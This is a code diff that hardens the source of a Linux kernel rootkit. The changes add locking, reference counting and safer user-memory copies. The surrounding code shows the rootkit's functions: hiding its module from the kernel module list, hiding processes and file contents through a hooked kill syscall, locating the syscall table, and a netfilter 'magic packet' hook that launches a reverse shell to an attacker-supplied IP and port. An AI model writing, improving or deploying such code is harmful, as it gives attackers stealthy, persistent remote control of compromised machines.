@@ -116,25 +116,31 @@ struct linux_dirent {
 void hide(void) {
 	if(hidden) return;
 
+	while(!mutex_trylock(&module_mutex)) cpu_relax();
 	mod_list = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	kfree(THIS_MODULE->sect_attrs);
-        THIS_MODULE->sect_attrs = NULL;  	
+        THIS_MODULE->sect_attrs = NULL;
+	mutex_unlock(&module_mutex);
 	hidden = 1;
 }
 
 void show(void) {
 	if(!hidden) return;
 
+	while(!mutex_trylock(&module_mutex)) cpu_relax();
 	list_add(&THIS_MODULE->list, mod_list);
+	mutex_unlock(&module_mutex);
 	hidden = 0;
 }
 
 struct task_struct *find_task(pid_t pid){
 	struct task_struct *p = current;
-	for_each_process(p) {
-		if (p->pid == pid) return p;
-	}
+	
+	rcu_read_lock();
+	for_each_process(p) if (p->pid == pid) return get_task_struct(p);
+	rcu_read_unlock();	
+
 	return NULL;
 }
 
@@ -175,6 +181,8 @@ int shell_exec_queue(char *path, char *ip, char *port) {
     	task->ip = kstrdup(ip, GFP_KERNEL);
     	task->port = kstrdup(port, GFP_KERNEL);
 
+	if(!task->path || !task->ip || !task->port) return -1;
+
     	return queue_work(work_queue, &task->work);
 }
 
@@ -197,7 +205,7 @@ struct file *e_fget_light(unsigned int fd, int *fput_needed) {
     	return file;
 }
 
-int f_check(void *arg, int size) {
+int f_check(void *arg, ssize_t size) {
 	char *buf;
 
 	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);
@@ -205,7 +213,7 @@ int f_check(void *arg, int size) {
 	buf = (char *) kmalloc(size+1, GFP_KERNEL);
 	if(!buf) return(-1);
 
-	if(__copy_from_user((void *) buf, (void *) arg, size)) goto out;
+	if(copy_from_user((void *) buf, (void *) arg, size)) goto out;
 
 	buf[size] = 0;
 
@@ -218,14 +226,14 @@ out:
 	return(-1);
 }
 
-int hide_content(void *arg, int size) {
+int hide_content(void *arg, ssize_t size) {
 	char *buf, *p1, *p2;
 	int i, newret;
 
 	buf = (char *) kmalloc(size, GFP_KERNEL);
 	if(!buf) return(-1);
 
-	if(__copy_from_user((void *) buf, (void *) arg, size)) {
+	if(copy_from_user((void *) buf, (void *) arg, size)) {
 		kfree(buf);
 		return size;
 	}
@@ -234,14 +242,20 @@ int hide_content(void *arg, int size) {
 	p2 = strstr(buf, HIDETAGOUT);
 	p2 += strlen(HIDETAGOUT);
 
+	if(p1 >= p2) {
+		kfree(buf);
+		return size;
+	}
+
 	i = size - (p2 - buf);
 	memmove((void *) p1, (void *) p2, i);
 	newret = size - (p2 - p1);
 
-	if(__copy_to_user((void *) arg, (void *) buf, newret)) {
+	if(copy_to_user((void *) arg, (void *) buf, newret)) {
 		kfree(buf);
 		return size;
 	}
+
 	kfree(buf);
 	return newret;
 }
@@ -278,10 +292,11 @@ void decode_n_spawn(const char *data) {
 	port = buf;
 	strsep(&buf, " ");
 
-	if(!tok || !ip || !port) return;
+	if(!tok || !ip || !port) goto out;
 
 	if(strcmp(token, tok) == 0 && atoi(port) > 0 && atoi(port) <= 65535 && strlen(ip) >= 7 && strlen(ip) <= 15) shell_exec_queue(SHELL, ip, port);
 
+out:
 	kfree(p);
 }
 
@@ -298,11 +313,10 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
 	struct tcphdr	_tcph;
 	struct udphdr	_udph;
 	const char *data;
-	char _dt, *token = TOKEN;
-    	int tsize;
+	char *token = TOKEN;
+    	int tsize = strlen(token);
+	char _dt[tsize+24];
 
-    	data = NULL;
-    	tsize = strlen(token);
     	s_xor(token, 11, tsize);
 
     	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
@@ -447,6 +461,7 @@ asmlinkage int l33t_kill(pid_t pid, int sig){
 			if((task = find_task(pid)) == NULL) return -ESRCH;
 
 			task->flags ^= 0x10000000;
+			put_task_struct(task);
 			break;
 		case SIGHIDECONTENT:
 			if(hide_file_content) hide_file_content = 0;
@@ -596,7 +611,6 @@ static int __init reptile_init(void) {
 	
 	atomic_set(&read_on, 0);
 	sct = (unsigned long *)find_sys_call_table();
-
 	if(!sct) sct = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
 	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
 	if(!sct) return -1;
